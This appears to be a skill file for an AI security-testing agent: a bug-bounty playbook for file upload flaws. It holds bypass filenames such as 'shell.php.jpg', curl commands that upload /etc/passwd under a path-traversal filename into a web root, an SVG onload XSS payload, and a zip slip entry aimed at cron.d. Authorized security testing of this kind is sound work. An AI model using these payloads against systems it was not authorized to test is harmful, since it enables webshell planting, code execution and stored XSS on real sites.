---
name: file-upload
description: File upload vulnerability playbook — extension/MIME bypass, polyglots, path traversal in filenames, ImageMagick/Ghostscript RCE, SVG XSS, zip slip, and parser confusion. Use when the target accepts avatars, documents, imports, attachments, or media uploads.
allowed-tools:
  - shell
  - http
  - coverage
  - confirm_finding
  - file_write
---

# File upload playbook

Upload handlers fail on **validation gaps** between client, server extension check, content-type, and actual parser.

## 1. Map upload endpoints
Find multipart forms, `/upload`, `/avatar`, `/import`, presigned S3 PUT URLs, GraphQL `Upload` scalars.

Note:
- Allowed extensions advertised in UI
- Max size, dimension checks
- Where uploaded files are served from (`/uploads/`, CDN, S3 public URL)

## 2. Extension and MIME bypass matrix
Try each axis independently:

| Vector | Example |
|--------|---------|
| Double extension | `shell.php.jpg` |
| Null byte (legacy) | `shell.php%00.jpg` |
| Case | `shell.PhP` |
| Trailing chars | `shell.php/`, `shell.php.` |
| Content-Type spoof | `image/jpeg` body with PHP/JS |
| Magic bytes only | JPEG header + PHP in comment |

```sh
TARGET="https://app.example.com"
curl -ksS -X POST "$TARGET/upload" \
  -H "Cookie: $SESSION" \
  -F 'file=@poc.svg;type=image/svg+xml' \
  -F 'name=test' -w '\nHTTP %{http_code}\n'
```

## 3. Stored XSS via SVG/HTML
If uploads are served back with `Content-Type: image/svg+xml` or sniffable as HTML:

```xml
<!-- poc.svg -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

Confirm URL where file is served and whether admin/victim context executes it.

## 4. Path traversal in filename
```sh
curl -ksS -X POST "$TARGET/upload" \
  -F 'file=@/etc/passwd;filename=../../../var/www/html/shell.php' \
  -H "Cookie: $SESSION"
```

Check response for stored path; attempt to fetch uploaded URL.

## 5. ImageTragick / document parsers
If policy allows ImageMagick, Ghostscript, ffmpeg, libvips — search CVE for pinned version (`web_search`). Craft minimal PoC only after version confirmation.

## 6. Zip slip (extract endpoints)
If server extracts ZIP:
- Entry path `../../etc/cron.d/evil`
- Confirm write outside intended dir via error message or follow-up read

## 7. Report
Include:
- Exact filename, Content-Type sent, and final stored URL
- Response proving execution or XSS (screenshot excerpt / response body)
- RCE vs XSS severity mapping

VRT: `Unvalidated Redirects and Forwards` / `Injection` / `Stored XSS` / `RCE` depending on outcome.

Call `confirm_finding` with reproducible upload + access steps.
